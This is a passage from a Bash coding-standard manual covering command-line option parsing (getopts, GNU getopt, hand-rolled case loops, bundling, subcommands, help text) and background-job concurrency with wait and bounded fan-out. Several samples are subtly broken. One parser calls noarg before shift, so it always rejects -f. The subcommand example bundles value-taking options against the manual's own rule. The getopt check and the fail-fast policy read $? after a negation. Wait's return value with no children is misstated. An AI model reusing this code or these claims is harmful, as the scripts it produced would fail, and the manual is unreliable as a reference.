which uses the BCS bundling expansion explicitly:

```bash
# scenario: BCS bundling pattern (hand-rolled, NOT getopts)
case $1 in
  -[vqfh]?*) set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
esac
```

The character class `[vqfh]` lists exactly the recognised short
options (BCS0805) — extending the parser means extending this class
too.

### Strict-mode interactions

- `getopts` returns non-zero on EOF; `while getopts ...; do` is the
  loop condition, so this exit is ignored by `errexit` (the same
  exemption as `while read -r`).
- An explicit non-zero from inside a `case` arm (e.g. `:)` or `\?)`)
  is *not* exempt; wrap with `||` or call `die` which handles its
  own exit.
- `OPTERR=0` is an alternative to the leading `:`, but they are not
  cumulative — pick one mechanism. Silent mode (`:` prefix) is the
  BCS recommendation because it lets you distinguish missing-value
  (`:`) from unknown-option (`?`) cases.

### When *not* to use getopts

- You need long options (`--verbose`, `--file=PATH`).
- You need to validate option arguments before they reach the case.
- You want consistent BCS messaging on errors.
- The script has more than ~5 options — the case readability
  advantage of the hand-rolled pattern dominates.

### See also

- §15.4 — BCS hand-rolled `while case shift` (recommended default)
- §15.6 — bundled short options
- §15.7 — `--` end-of-options marker
- BCS0801 (parsing pattern), BCS0803 (argument validation),
  BCS0805 (short-option bundling)

## 15.3 GNU `getopt(1)` external

The external GNU `getopt` parses both short and long options and
re-quotes the result for `eval`. Powerful, portable in theory, brittle
in practice — BCS does not endorse it (§15.4 is preferred).

### Syntax

```bash
# scenario: minimal GNU getopt invocation
parsed=$(getopt -o 'vqf:h' --long 'verbose,quiet,file:,help' -n "$0" -- "$@")
eval set -- "$parsed"
while true; do
  case $1 in
    -v|--verbose) VERBOSE=1; shift ;;
    -q|--quiet)   VERBOSE=0; shift ;;
    -f|--file)    FILE=$2; shift 2 ;;
    -h|--help)    usage; exit 0 ;;
    --)           shift; break ;;
    *)            die 22 "internal error: $1" ;;
  esac
done
```

The `-o` short-option list and `--long` long-option list both use `:`
to mark a value-taking option (one colon for required, two for
optional — but optional values are themselves a quoting hazard).

### BSD vs GNU detection

`getopt(1)` exists on both Linux (GNU, util-linux) and BSD/macOS, but
the BSD variant has *no* long-option support and a different argument
order. Detect before invoking:

```bash
# scenario: refuse to run if the local getopt is the BSD flavour
if ! getopt --test >/dev/null 2>&1; (( $? != 4 )); then
  die 18 'GNU getopt(1) required (BSD getopt does not support --long)'
fi
```

GNU getopt's `--test` flag exits with status 4 (a deliberate sentinel)
to signal "I'm the GNU one." Anything else — exit 0, exit 1, or "no
such option" — means the script is on a system without GNU getopt and
must either fall back to a hand-rolled parser (§15.4) or die.

### Why BCS prefers hand-rolled

- Requires `eval` of the re-quoted output — quoting bugs become
  injection vectors (BCS1004).
- Adds an external dependency that may not exist (BSD systems, busybox,
  Alpine without `util-linux`).
- The detection ritual above is more code than the equivalent
  `while case shift` loop.
- Errors are reported by `getopt` itself, before script logic runs;
  customising the message requires disabling `getopt`'s own reporting
  with `+`-prefixed optstring.

### See also

- §15.2 — POSIX `getopts` (builtin, no eval, short options only)
- §15.4 — the BCS canonical hand-rolled parser
- BCS0801 (standard parsing pattern), BCS1004 (eval avoidance)

## 15.4 Hand-rolled `while case shift`

The BCS canonical pattern (BCS0801, BCS0805). Handles long-with-equals,
bundled short options, and end-of-options uniformly inside a single
`case` block, with no external dependency and no `eval`.

```bash
parse_args() {
  while (($#)); do
    case $1 in
      -h|--help)        usage; return 0 ;;
      -v|--verbose)     VERBOSE=1 ;;
      -q|--quiet)       VERBOSE=0 ;;
      -n|--dry-run)     DRY_RUN=1 ;;
      -f|--file)        shift; noarg "$@"; FILE=$1 ;;
      --file=*)         FILE=${1#*=} ;;
      -[abc]?*)         set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
      --)               shift; POSITIONAL+=("$@"); break ;;
      -*)               die 22 "unknown option: $1" ;;
      *)                POSITIONAL+=("$1") ;;
    esac
    shift
  done
}
```

### Per-arm walkthrough

| Arm | Purpose |
|-----|---------|
| `-h\|--help` | dual short/long help; returns 0 (BCS0806) |
| `-v\|--verbose`, `-q\|--quiet`, `-n\|--dry-run` | flags — toggle a global, no value |
| `-f\|--file` | value-taking option, space form: `shift` past flag, validate next arg, capture |
| `--file=*` | value-taking option, equals form: strip prefix with `${1#*=}` |
| `-[abc]?*` | bundling expander (see below) |
| `--` | end-of-options sentinel (§15.7) |
| `-*` | unknown option catch-all (BCS0602: exit 22) |
| `*` | positional accumulator |

`while (($#))` (BCS0501) is the loop guard — it does not invoke `shift`
itself, so `shift_verbose` (warn-on-empty-shift) never triggers; each
arm shifts deliberately.

### The `noarg` helper — definition

`noarg` validates that a value-taking option actually has a value to
take. The BCS-canonical implementation:

```bash
# helper used by every -f|--file style arm
noarg() {
  if (($# < 1)) || [[ ${1:0:1} == - ]]; then
    die 22 "option requires an argument"
  fi
}
```

Why `[[ ${1:0:1} == - ]]` rather than `[[ $1 == -* ]]`: under `set -u`
both are safe because `${1:0:1}` returns empty when `$1` is unset, but
the substring form matches faster and is unambiguous about treating
`$1=""` as "no value." The default-expansion `${1:-}` is *not* needed
inside `[[ ... ]]` because bash treats unset positionals as empty
inside that compound — but BCS still recommends `${1:-}` for clarity
when the arm is called outside a guarded `(($#))` loop.

### Bundling-class character set

`-[abc]?*` only catches bundles built from the listed flag-only short
options. To extend it, add the new short letter to the character class
*and* ensure that letter has a flag-only arm above the bundling line:

```bash
# scenario: add -d (dry-run shorthand) to the bundling class
-d|--dry-run)       DRY_RUN=1 ;;
-[abcd]?*)          set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
```

Never add a value-taking short letter (`-f` here) to the class — the
bundling expander would split `-fname` into `-f` and `-name`, but the
`-f` arm expects the *next* argv slot, not the remainder of the
bundled string. See §15.6 for the expander semantics.

### Strict-mode interactions

- `(($#))` is the loop *condition*, exempt from `set -e`.
- `shift` past the last positional is a no-op — `shift_verbose` would
  warn but the `(($#))` guard prevents that case.
- `noarg`'s `die` exits the script with code 22 (BCS0602).

### See also

- §15.5 — long-option forms (space and equals)
- §15.6 — bundling expansion, deeply explained
- §15.7 — end-of-options sentinel
- BCS0801 (standard parsing pattern), BCS0805 (short option bundling),
  BCS0803 (argument validation)

## 15.5 Long options

GNU-style long options accept two equivalent value forms: the
space-separated `--file value` and the equals form `--file=value`.
Well-behaved scripts accept both (BCS0806).

### Both forms in one case-block

The canonical pattern dedicates two `case` arms per value-taking long
option — one each for the two forms:

```bash
# scenario: one option, two forms, one parser
parse_args() {
  while (($#)); do
    case $1 in
      -f|--file)       shift; noarg "$@"; FILE=$1 ;;       # space form
      --file=*)        FILE=${1#*=} ;;                     # equals form
      -h|--help)       usage; return 0 ;;
      --)              shift; POSITIONAL+=("$@"); break ;;
      -*)              die 22 "unknown option: $1" ;;
      *)               POSITIONAL+=("$1") ;;
    esac
    shift
  done
}

# all three calls produce FILE=config.yaml
parse_args -f config.yaml
parse_args --file config.yaml
parse_args --file=config.yaml
```

`${1#*=}` is BCS0207 parameter expansion — strip the shortest match of
`*=` from the front of `$1`, leaving everything after the first `=`.
That handles values containing `=` themselves: `--filter=key=value`
captures `key=value` correctly.

### Flag-only long options

Flag-only forms (no value) need only one arm:

```bash
-v|--verbose)        VERBOSE+=1 ;;
-q|--quiet)          VERBOSE=0 ;;
```

Combined with a value-taking arm, the same `case` block handles both
flag-only and value-taking long options without losing readability.

### Consistency rule

Either accept both forms or only one — pick a discipline and stick to
it across the whole script. Mixing (`--file value` works but
`--filter=value` does not) is the single most common CLI bug pattern
in shell scripts.

### Documentation

Help output should show both forms when both are accepted (§15.9):

```text
Options:
  -f, --file FILE          read FILE (or --file=FILE)
```

### See also

- §15.4 — full hand-rolled parser
- §15.7 — `--` end-of-options sentinel
- §15.9 — help text conventions
- BCS0207 (parameter expansion), BCS0806 (standard options)

## 15.6 Bundled short options

Combining multiple short flags into one argument (`-abc` for
`-a -b -c`) is a long-standing UNIX convention (BCS0805). Bash has no
builtin bundling support; the parser must expand bundles itself.

### The bundling expander

```bash
-[abc]?*)            set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
```

Three pieces, each load-bearing:

| Fragment | Result |
|----------|--------|
| `${1:0:2}` | the leading two chars of `$1` — e.g., `-a` from `-abc` |
| `-${1:2}`  | a hyphen plus the rest — e.g., `-bc` from `-abc` |
| `${@:2}`   | the rest of the original argv slots, unchanged |

Putting them together, `set -- ...` rewrites `$@` so that the next
loop iteration sees the un-bundled head separately from the still-
bundled tail. `continue` (rather than `shift`) skips the trailing
`shift` at the end of the loop body — the rewrite already advanced
the parser.

### Worked input/output

```bash
# scenario: trace a single bundled call through the expander
# initial argv: -abc input.txt
# arm: -[abc]?*) matches because ${1:0:2}=-a, ${1:2}=bc

# after set --:
#   $1=-a   $2=-bc   $3=input.txt

# next iteration: $1=-a hits the -a arm (whatever it is), shift
#   $1=-bc  $2=input.txt
# -[abc]?* matches again: $1=-b, $2=-c, $3=input.txt
# next iteration: -b arm, shift
#   $1=-c   $2=input.txt
# next iteration: -c arm, shift
#   $1=input.txt — matches the * positional arm
```

The expander runs N-1 times for an N-character bundle, splitting one
flag off per iteration. `continue` is critical: a `shift` after the
rewrite would discard the freshly-promoted `-a` before its arm could
fire.

### Character-class extension rule

The class `[abc]` lists every short option that may appear inside a
bundle. To enable `-d` for bundling:

```bash
# wrong — adds -d to the parser but not to the bundling class
-d|--dry-run)       DRY_RUN=1 ;;
-[abc]?*)           set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
# now -dabc is rejected by -*) as unknown

# right — letter appears in both the dispatch and the bundling class
-d|--dry-run)       DRY_RUN=1 ;;
-[abcd]?*)          set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
```

Value-taking short options must **not** appear in the class. `-fconfig`
should be a single value-bearing argument (`-f` with value `config`),
not the bundle `-f -c -o -n -f -i -g`.

### Why this trick works

`${1:0:2}` is a substring expansion (BCS0207). The two-character form
`-a`, `-b`, etc. is exactly two bytes. The trailing `?*` in the case
pattern requires at least one more character after the leading flag,
so a non-bundle like `-a` falls through to the regular `-a` arm.

### See also

- §15.4 — the full hand-rolled parser with bundling
- §15.5 — long-option forms (not bundled)
- BCS0805 (short option bundling), BCS0207 (parameter expansion)

## 15.7 `--` end-of-options

Standard convention for ending option processing (BCS0806). After the
literal `--`, every remaining argument is positional, even if it
starts with `-`. Without this discipline a filename like `-rf` is
silently parsed as the option `-r` followed by `-f`.

### The case arm

```bash
--)            shift; POSITIONAL+=("$@"); break ;;
```

`shift` skips the `--` itself; `POSITIONAL+=("$@")` slurps every
remaining argv slot into the array; `break` exits the loop.

### Filename-with-leading-dash

```bash
# scenario: a file named -input.log must be passable to the script
mytool --verbose -- -input.log

# inside parse_args, the loop reaches:
#   $1=-input.log  (after -- has been consumed)
# the * arm fires: POSITIONAL+=("$1") — captures the literal name
```

Without the `--`, the arm `-*) die 22 "unknown option: $1"` rejects
`-input.log` as an unknown flag. The `--` sentinel is the canonical
escape hatch.

### Pass-through to children

Long-running wrappers should propagate `--` to inner commands so the
escape hatch chains through the whole pipeline:

```bash
# scenario: outer wrapper that passes positionals through to rsync
parse_args "$@"
rsync -av --delete -- "${POSITIONAL[@]}"
```

This way `mytool -- -src dest` reaches `rsync -- -src dest`, which in
turn treats `-src` as a literal source path.

### When to omit

Scripts that take *no* positional arguments do not need `--` handling.
A `*) die 22 "unexpected argument: $1"` arm protects against typos
without needing the sentinel.

### Cross-tool register

Most GNU tools honour `--`: `rm -- -file`, `grep -- -pattern file`,
`git checkout -- file`. Documenting it in `--help` (§15.9) under the
"Use `--` to end option processing" hint is good practice.

### See also

- §15.1 — CLI conventions
- §15.4 — full hand-rolled parser
- BCS0801 (standard parsing pattern), BCS0806 (standard options)

## 15.8 Subcommand dispatch

Multi-command CLIs (like `git`, `bcs`, `kubectl`) dispatch a
subcommand to a handler function (BCS0801).

### Top-level dispatcher

```bash
main() {
  case ${1:-} in
    init)    shift; cmd_init "$@" ;;
    build)   shift; cmd_build "$@" ;;
    deploy)  shift; cmd_deploy "$@" ;;
    help)    shift; cmd_help "$@" ;;
    ''|-h|--help)  usage; exit 0 ;;
    *)       die 22 "unknown subcommand: $1" ;;
  esac
}
main "$@"
```

- One function per subcommand: `cmd_NAME`.
- `${1:-}` defends against `set -u` when called with no args.
- The `''` arm (empty string) and `-h`/`--help` share usage output.

### Per-subcommand option parsing

Each `cmd_NAME` parses its own options independently — top-level
options (e.g., `--verbose`) parse before the subcommand, while
subcommand-specific options (e.g., `--target=...` for `deploy`) parse
inside the handler:

```bash
cmd_deploy() {
  local -- target='' env='prod'
  while (($#)); do
    case $1 in
      -t|--target)     shift; noarg "$@"; target=$1 ;;
      --target=*)      target=${1#*=} ;;
      -e|--env)        shift; noarg "$@"; env=$1 ;;
      --env=*)         env=${1#*=} ;;
      -[teh]?*)        set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
      -h|--help)       show_deploy_help; return 0 ;;
      --)              shift; break ;;
      -*)              die 22 "deploy: unknown option: $1" ;;
      *)               break ;;
    esac
    shift
  done
  [[ -n $target ]] || die 22 'deploy: --target required'
  do_deploy "$target" "$env" "$@"
}
```

Note the bundling class `[teh]` matches the short forms of every
flag-only or boolean-toggle option in this subcommand — the value-
taking `-t` and `-e` are *also* in the class because they have both
short and long forms; the bundle expander separates the leading `-t`
or `-e` and the regular arm sees the value in `$2`.

### `bcs` itself uses this pattern

The `bcs` script dispatches `display`, `template`, `check`, `codes`,
`generate`, and `help`; each is implemented as `cmd_NAME` with a
matching `show_NAME_help`. The same `case` shape, the same option
loop, and the same `-[abc]?*` bundling expansion appear in every
handler — the dispatcher pattern scales by repetition without any
extra mechanism. See `bcs:main()` and the per-subcommand helpers it
delegates to.

### Help routing

A subcommand-aware help helper resolves `mytool help deploy` to
`show_deploy_help`:

```bash
cmd_help() {
  case ${1:-} in
    init)    show_init_help ;;
    build)   show_build_help ;;
    deploy)  show_deploy_help ;;
    '')      usage ;;
    *)       die 22 "unknown subcommand: $1" ;;
  esac
}
```

### See also

- §15.4 — option parsing inside `cmd_*` handlers
- §15.9 — per-subcommand `--help`
- BCS0801 (standard parsing pattern), BCS0806 (standard options)

## 15.9 Help text conventions

Conventions for `--help` output (BCS0704). The text is a contract
between the script and its callers; departures from convention break
muscle memory.

### Required sections

- **Usage line** — `Usage: NAME [OPTIONS] [ARGS]`.
- **Brief description** — one short paragraph immediately below.
- **Options block** — `-x, --long DESC` indented two spaces, aligned.
- **Examples** — at least one realistic invocation.
- **Exit codes** — when more than `0`/`1` are used (BCS0602).
- **See also** — pointer to man page, related commands, project URL.

### Width and stream

- 80 columns or current terminal width — never wider.
- Always to **stdout** (so users can `mytool --help | less`).
- Exit `0` (help is success).

### Fully-formed sample

```bash
# scenario: a real --help, line by line
usage() {
  cat <<HELP
$SCRIPT_NAME $VERSION -- Synchronise local files to a remote server.

Usage: $SCRIPT_NAME [OPTIONS] SOURCE [SOURCE...] DEST

Description:
  Wraps rsync with project conventions: dry-run by default, exclude
  patterns from .syncignore, and refuse to run on the production hosts
  unless --not-dry-run is given.

Options:
  -n, --dry-run            preview changes (default)
  -N, --not-dry-run        execute the sync
  -d, --delete             delete extraneous files at DEST
  -x, --exclude PATTERN    additional exclude (repeatable)
  -V, --venv               include .venv directories
  -v, --verbose            increase verbosity
  -q, --quiet              suppress informational output
  -h, --help               show this help and exit
      --version            show version and exit

Examples:
  # preview a sync to ok1
  $SCRIPT_NAME 1

  # actually push to ok1, ok2, ok3
  $SCRIPT_NAME -N 1 2 3

  # sync with .venv included and a custom exclude
  $SCRIPT_NAME -NV -x '*.tmp' 1

Exit codes:
  0   success
  1   general error
  2   usage error
  18  missing dependency (rsync)
  22  invalid argument

See also:
  rsync(1), push-to-okusi(8), https://example.com/docs/sync
HELP
}
```

### Heredoc discipline

- Use a quoted-or-unquoted heredoc consistently — the example above
  expands `$SCRIPT_NAME` and `$VERSION` because the delimiter `HELP`
  is unquoted (BCS0904). For static help text, quote the delimiter
  (`<<'HELP'`) to skip expansion.
- Two-space indent on the options column; align the description column
  to a fixed offset (24 columns is the common BCS choice).

### Per-subcommand help

Subcommand CLIs (§15.8) need both a top-level usage and a
`show_NAME_help` for each subcommand. The top-level usage lists
subcommands rather than options:

```text
Subcommands:
  init       initialise a new project
  build      build the artefact
  deploy     deploy to a target
  help       show subcommand help

Run '$SCRIPT_NAME help SUBCOMMAND' for per-subcommand help.
```

### See also

- §15.10 — synopsis grammar (the `[OPTIONS] SOURCE...` syntax)
- §15.11 — auto-generating usage from option specs
- BCS0704 (usage documentation), BCS0602 (exit codes)

## 15.10 Synopsis grammar

Notation for documenting CLI syntax.

- `[X]` — optional.
- `X|Y` — choice.
- `X...` — one or more.
- `[X...]` — zero or more.
- Uppercase: placeholder; lowercase: literal.
- Example: `cmd [-v] [-f FILE] {init|build|deploy} [ARGS...]`.
- Match the man-page convention for consistency.

## 15.11 Auto-generating usage

The hardest bug to keep out of a CLI is **drift** between `--help` and
the parser: a new option lands in the case loop but the help text is
not updated, or vice versa. Two BCS-aligned patterns prevent this:
single-source-of-truth (one spec drives both) and the deferred-action
pattern (the parser writes pending mutations into globals, the help
text reads from the same globals).

### Pattern 1 — heredoc co-located with parser

The simplest approach, used by the BCS `complete` template: keep
`show_help` and the parser in the same file, in adjacent functions,
and discipline yourself to edit them together. Tests close the loop.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r SCRIPT_NAME=${0##*/} VERSION=1.0.0
declare -i VERBOSE=1 DRY_RUN=0
declare -- FILE=''

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION -- demo tool

Usage: $SCRIPT_NAME [OPTIONS] ARG

Options:
  -v, --verbose      Enable verbose output (default)
  -q, --quiet        Disable verbose output
  -n, --dry-run      Preview changes without applying
  -f, --file PATH    Input file
  -V, --version      Show version
  -h, --help         Show this help message
HELP
}

main() {
  while (($#)); do
    case $1 in
      -v|--verbose)  VERBOSE=1 ;;
      -q|--quiet)    VERBOSE=0 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -f|--file)     noarg "$@"; shift; FILE=$1 ;;
      --file=*)      FILE=${1#*=} ;;
      -V|--version)  printf '%s %s\n' "$SCRIPT_NAME" "$VERSION"; exit 0 ;;
      -h|--help)     show_help; exit 0 ;;
      -[vqnfVh]?*)   set -- "${1:0:2}" "-${1:2}" "${@:2}"; continue ;;
      --)            shift; break ;;
      -*)            die 22 "unknown option: $1" ;;
      *)             break ;;
    esac
    shift
  done
}

main "$@"
```

Lock the contract with a test:

```bash
# scenario: regression-test that --help mentions every parsed option
for opt in --verbose --quiet --dry-run --file --version --help; do
  myscript --help | grep -qF -- "$opt" \
    || die 1 "help text missing $opt"
done
```

### Pattern 2 — single-source-of-truth spec

For larger CLIs, drive both help and parsing from one declarative
spec. The BCS-friendly form is an indexed array of `tab`-separated
records, walked twice — once to render help, once to build the case
arms via a generated dispatch table.

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r SCRIPT_NAME=${0##*/}
declare -i VERBOSE=1 DRY_RUN=0
declare -- FILE=''

# spec: short<TAB>long<TAB>arg?<TAB>variable<TAB>description
declare -a OPTSPEC=(
  $'-v\t--verbose\t0\tVERBOSE=1\tEnable verbose output'
  $'-q\t--quiet\t0\tVERBOSE=0\tDisable verbose output'
  $'-n\t--dry-run\t0\tDRY_RUN=1\tPreview changes only'
  $'-f\t--file\t1\tFILE\tInput file'
)

show_help() {
  printf '%s -- demo tool\n\nUsage: %s [OPTIONS]\n\nOptions:\n' \
    "$SCRIPT_NAME" "$SCRIPT_NAME"
  local row short long arg var desc
  for row in "${OPTSPEC[@]}"; do
    IFS=$'\t' read -r short long arg var desc <<<"$row"
    if ((arg)); then
      printf '  %s, %s VALUE   %s\n' "$short" "$long" "$desc"
    else
      printf '  %s, %s          %s\n' "$short" "$long" "$desc"
    fi
  done
}

parse_args() {
  while (($#)); do
    local matched=0 row short long arg var
    for row in "${OPTSPEC[@]}"; do
      IFS=$'\t' read -r short long arg var _ <<<"$row"
      [[ $1 == "$short" || $1 == "$long" ]] || continue
      if ((arg)); then noarg "$@"; shift; printf -v "$var" '%s' "$1"
      else             eval "$var"; fi      # var holds 'NAME=value'
      matched=1; break
    done
    ((matched)) || case $1 in
      -h|--help) show_help; exit 0 ;;
      --)        shift; break ;;
      -*)        die 22 "unknown option: $1" ;;
      *)         break ;;
    esac
    shift
  done
}
```

The spec is the single source of truth. Adding a flag means appending
one row; both help and parser pick it up automatically. The `eval`
target is a string the script itself authored (BCS1004 allows such
constrained use); the value-carrying case uses `printf -v "$var"`
which never evals.

### Trade-offs

| Pattern             | Pros                                 | Cons                          |
|---------------------|--------------------------------------|-------------------------------|
| Heredoc + case      | Simple, readable, BCS template form  | Manual sync; relies on tests  |
| Spec array          | Single source of truth, no drift     | Indirection; harder to debug  |

For most BCS scripts (≤10 options), pattern 1 plus a `--help`
regression test is the right choice. Pattern 2 starts paying off
around 15+ options or when multiple subcommands share option groups.

### See also

- §15.4 — hand-rolled `while case shift`
- §15.8 — subcommand dispatch
- §15.9 — help text conventions
- BCS0801 (parsing pattern), BCS0803 (argument validation),
  BCS0805 (short-option bundling), BCS1004 (constrained `eval`)

# Part XVI — Concurrency and Parallelism

*Bash supports background jobs, wait-for-any, bounded fan-out, and external parallelism tools. This Part documents the patterns and the pitfalls.*

---

---

## 16.1 Sequential vs background execution

A command run unadorned blocks the script until it finishes; the same
command suffixed with `&` runs in the background and returns
immediately. The two forms are the foundation of every concurrency
pattern in bash (BCS1101).

### Form register

- `cmd` — foreground; blocks; exit status in `$?`.
- `cmd &` — background; returns immediately; PID in `$!`.
- `cmd & wait $!` — semantically equivalent to plain `cmd` (foreground)
  but routes through the job table.
- Multiple `cmd1 & cmd2 & cmd3 & wait` — parallel fan-out.
- `cmd & disown` — background, then detach from the job table so the
  shell does not deliver SIGHUP on exit.

### `wait $!` vs `disown`

These two are easily confused. `wait $!` blocks until the most recent
background job finishes and reports *its* exit status — the script
treats the spawned process as part of itself. `disown` releases the
job from the shell's responsibility — the script treats the spawned
process as an independent runaway:

```bash
# scenario: rejoin the child to get its exit status
expensive_task &
wait $!
rc=$?
(( rc == 0 )) || die 1 "task failed (rc=$rc)"

# scenario: spawn a daemon that should outlive the script
nohup long_lived_daemon >/var/log/daemon.log 2>&1 &
disown
# script exits, daemon keeps running
```

`disown` without args drops the most recent job; `disown -h $!` keeps
the job in the table but marks it as immune to SIGHUP; `disown -a`
drops all jobs.

### Redirecting background output

Background processes inherit the script's stdout and stderr. If the
script is being piped, that means *every* backgrounded child writes to
the same downstream — output interleaves. Redirect explicitly:

```bash
# scenario: each worker writes to a per-PID log; main stdout stays clean
worker() {
  local -- task=$1
  exec >"/tmp/worker.$$.log" 2>&1
  do_work "$task"
}

for task in t1 t2 t3; do
  worker "$task" &
done
wait
```

`exec >/tmp/...` rewires the worker's stdout/stderr *before* the
business logic runs; the parent's redirection state is untouched.

### See also

- §16.2 — `wait` and `wait -n`
- §16.5 — bounded fan-out
- BCS1101 (background job management), BCS1103 (wait patterns)

## 16.2 `wait` and `wait -n`

Synchronise the parent script with one or more background children
(BCS1103). The semantics differ in subtle but load-bearing ways
between bash versions.

### Form register

- `wait` — wait for *all* children; exit status is 0 (or 127 if there
  were no children).
- `wait $pid` — wait for a specific child; `$?` becomes that child's
  exit status.
- `wait -n` — wait for *any* child to exit (Bash 4.3+); `$?` is the
  exited child's status.
- `wait -n $pid1 $pid2 …` — wait for any of these specific children
  (Bash 5.1+).
- `wait -p VAR -n` — store the PID of the exited child in `VAR`
  (Bash 5.1+).
- `wait` with no living children: returns 127.

### Feature matrix

| Form | Bash 4.0–4.2 | Bash 4.3+ | Bash 5.1+ |
|------|:---:|:---:|:---:|
| `wait` | ✓ | ✓ | ✓ |
| `wait $pid` | ✓ | ✓ | ✓ |
| `wait -n` | ✗ | ✓ | ✓ |
| `wait -n $pid …` | ✗ | ✗ | ✓ |
| `wait -p VAR -n` | ✗ | ✗ | ✓ |

### `wait -n` loop

The Bash 5.1+ form is the cleanest way to drain a fixed number of
children one-at-a-time, e.g., to release a slot in a bounded fan-out:

```bash
# scenario: spawn 8 workers, react as each finishes (Bash 5.1+)
declare -a pids=()
for task in "${tasks[@]}"; do
  do_task "$task" &
  pids+=( $! )
done

declare -- done_pid rc
for ((i=0; i<${#pids[@]}; i+=1)); do
  wait -n -p done_pid; rc=$?
  printf 'pid %d finished with rc=%d\n' "$done_pid" "$rc"
done
```

`wait -n` blocks until any one of the script's children exits and
sets `$?` to that child's status. `-p done_pid` stores the PID so the
loop can reconcile it against the tracking array (see §16.5 for the
slot-management variant).

### Pre-5.1 fallback

Without `-p`, the script must scan its tracking array to discover
which child finished. The portable replacement is `wait` on a single
PID at a time, accepting head-of-line blocking:

```bash
# scenario: pre-5.1 — wait sequentially in spawn order
for pid in "${pids[@]}"; do
  wait "$pid"; rc=$?
  (( rc == 0 )) || warn "pid $pid failed (rc=$rc)"
done
```

This loses the "react as soon as any child finishes" property — a slow
first child blocks the loop until it completes — but is portable to
Bash 4.x and busybox-derived shells.

### Strict-mode interaction

`wait`'s exit status follows the child's exit status. Under
`set -e`, a non-zero from `wait` propagates and exits the script
unless the call appears in an exempt context (`||`, `if`, `while`).
Always capture: `wait "$pid" || rc=$?`.

### See also

- §16.3 — `wait $pid` for a specific child
- §16.5 — bounded fan-out using `wait -n -p`
- BCS1103 (wait patterns), BCS0601 (exit on error)

## 16.3 `wait $pid` for specific child

Capture per-child exit status.

```bash
sleep 1 & pid1=$!
sleep 2 & pid2=$!
wait $pid1; rc1=$?
wait $pid2; rc2=$?
```

- After waiting, status accessible via `$?` or saved variable.
- `wait` on a PID that's already been reaped returns its remembered status (bash keeps a small cache).
- Order doesn't matter for capturing — wait blocks until that child exits.

## 16.4 Capturing per-child exit status

`wait` only reports a single child's status at a time. To aggregate
results across a fan-out, hold the PIDs in one array and the statuses in
a parallel array indexed identically. The pattern below is the canonical
shape for a fan-out that must report each failure individually rather
than collapsing to "something failed" (BCS1103).

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit extglob nullglob

# scenario: dispatch one worker per input, aggregate per-child status
declare -a inputs=(host1 host2 host3 host4)
declare -a pids=() statuses=()
declare -i i=0 rc=0

for host in "${inputs[@]}"; do
  worker "$host" &
  pids[i]=$!
  ((i+=1))
done

# wait on each PID positionally; statuses[i] aligns with pids[i]
for i in "${!pids[@]}"; do
  if wait "${pids[i]}"; then
    statuses[i]=0
  else
    statuses[i]=$?
    rc=1
  fi
done
```

Aggregation logic must read both arrays together so the message names
the failing input, not just an index:

```bash
# scenario: human-readable failure report
for i in "${!pids[@]}"; do
  if (( statuses[i] != 0 )); then
    printf '%s failed (rc=%d, pid=%d)\n' \
      "${inputs[i]}" "${statuses[i]}" "${pids[i]}" >&2
  fi
done
exit "$rc"
# ⇒ exits 1 if any worker failed; stderr names each failed host
```

Notes:

- `wait "$pid"` returns the child's exit code; `set -e` would abort the
  loop on the first non-zero, so the explicit `if` is required. Trapping
  with `||` is equally valid: `wait "${pids[i]}" || statuses[i]=$?`.
- For a fixed-size pool, capture status inside the slot-recycling loop
  (see §16.5) rather than after a single `wait` barrier.
- `wait -n` (Bash 5.1+) reports the *next* child to exit but loses the
  per-PID mapping unless you also pass `-p var` to capture which PID it
  was; see §16.2.
- Per-child timeouts belong on the child, not the parent: wrap the
  worker in `timeout 30 worker "$host"` so the timeout exit code (124)
  propagates as a normal child status into `statuses[i]`.

### Aggregation policies

The shape above records every status; how the script *acts* on them
depends on policy. Three policies cover almost every real case:

```bash
# policy A — fail-fast: exit on the first non-zero, after killing siblings
for i in "${!pids[@]}"; do
  if ! wait "${pids[i]}"; then
    statuses[i]=$?
    kill -TERM "${pids[@]}" 2>/dev/null || true
    exit "${statuses[i]}"
  fi
done

# policy B — collect-all: run every child to completion, return worst rc
declare -i worst=0
for i in "${!pids[@]}"; do
  wait "${pids[i]}" || statuses[i]=$?
  (( statuses[i] > worst )) && worst=${statuses[i]}
done
exit "$worst"

# policy C — best-effort: tolerate failures, exit 0 unless all failed
declare -i ok=0
for i in "${!pids[@]}"; do
  wait "${pids[i]}" && ((ok+=1)) || statuses[i]=$?
done
(( ok > 0 )) || exit 1
```

Pick the policy that matches the caller's contract. A backup script
usually wants policy B; a deployment fan-out usually wants A; a
notification dispatcher usually wants C.

**See also**: §16.2 (`wait`/`wait -n`), §16.3 (single-child wait),
§16.5 (bounded fan-out), §16.11 (signal handling).

## 16.5 Bounded-concurrency fan-out

Run N tasks in parallel with a cap on simultaneously-running jobs
(BCS1102). The pattern: spawn until the cap is reached, then wait
for one slot to free up before spawning the next.

### Bash 5.1+ canonical form

```bash
# scenario: 4-way fan-out across an array of tasks
declare -i max=4
declare -a pids=()
declare -- done_pid

for task in "${tasks[@]}"; do
  while (( ${#pids[@]} >= max )); do
    wait -n -p done_pid
    # remove the finished PID from the tracking array
    for i in "${!pids[@]}"; do
      if [[ ${pids[i]} == "$done_pid" ]]; then
        unset 'pids[i]'
        break
      fi
    done
  done
  do_task "$task" &
  pids+=( $! )
done
wait      # drain whatever survived the last slot
```

`unset 'pids[i]'` removes the element by index. The array is now
*sparse* — index `i` is gone but other indices remain valid. The
`while (( ${#pids[@]} >= max ))` test counts living elements
correctly; sparse arrays do not corrupt `${#arr[@]}`.

### The buggy "alternative" to avoid

A common-but-broken shortcut tries to remove the PID with parameter-
expansion replacement:

```bash
# wrong — replacement only mutates string content, not array membership
pids=( "${pids[@]/$done_pid/}" )
# result: PID becomes empty string, array length unchanged
# the bound check ${#pids[@]} >= max never decreases — deadlock
```

